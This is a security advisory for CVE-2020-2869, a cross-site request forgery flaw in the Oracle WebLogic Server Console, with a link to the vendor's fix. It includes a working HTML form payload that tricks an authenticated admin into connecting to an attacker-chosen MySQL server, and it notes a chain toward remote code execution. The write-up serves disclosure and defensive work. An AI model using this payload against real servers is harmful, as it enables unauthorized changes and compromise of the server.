# CVE-2020-2869: Cross-Site Request Forgery in Oracle WebLogic Server

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console).
<br/>
Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0.
<br/>
Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server.
<br/>
Successful attacks require human interaction from a person other than the attacker.
<br/>
Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle WebLogic Server accessible data.
<br/>

### Vendor Disclosure:

The vendor's disclosure and fix for this vulnerability can be found [here](https://www.oracle.com/security-alerts/cpuapr2020.html).

### Proof Of Concept:

The "Test Connection" ("testConnectionConfiguration") action of the "createjdbcdatasource" endpoint of the Oracle WebLogic Server is vulnerable to Cross-Site Request Forgery (CSRF).
<br/>
Using this, an attacker may trick an authenticated user into connecting to an arbitrary datasource.
<br/>
<br/>
<strong>Note:</strong> The "Test Connection" endpoint seems to be just one of many enpoints vulnerable to CSRF.
<br/>

CSRF Testing MySQL Connection:

```
<html>
  <body>
    <form action="http://192.168.47.214:7001/console/console.portal?CreateGlobalJDBCDataSourcePortlet_actionOverride=/com/bea/console/actions/jdbc/datasources/createjdbcdatasource/testConnectionConfiguration" method="POST">
      <input type="hidden" name="CreateGlobalJDBCDataSourcePortletdriverClassName" value="com&#46;mysql&#46;cj&#46;jdbc&#46;MysqlXADataSource" />
      <input type="hidden" name="CreateGlobalJDBCDataSourcePortleturl" value="jdbc&#58;mysql&#58;&#47;&#47;192.168.47.196&#58;3306&#47;a" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Where:
- 192.168.47.214:7001 is the address to the server running the WebLogic application
- 192.168.47.196 is the ip for the MySQL Server

<img src="CSRF%20served%20by%20attacker.png"/>
<img src="Victim%20Executes%20CSRF.png"/>

### Additional Resources:

This vulnerability can be used to leverage [CVE-2020-2875: Oracle MySQL Connectors "LOAD DATA LOCAL INFILE" Attack](../CVE-2020-2875-MySQL%20LOAD%20DATA%20LOCAL%20INFILE%20Attack-Oracle%20MySQL%20Connectors/) and may result in [WebLogic Remote Code Execution](../CVE-2020-2875-MySQL%20LOAD%20DATA%20LOCAL%20INFILE%20Attack-Oracle%20MySQL%20Connectors/PoC%20for%20Oracle%20WebLogic/)

<img src="CSRF%20and%20CVE-2020-2875.png"/>
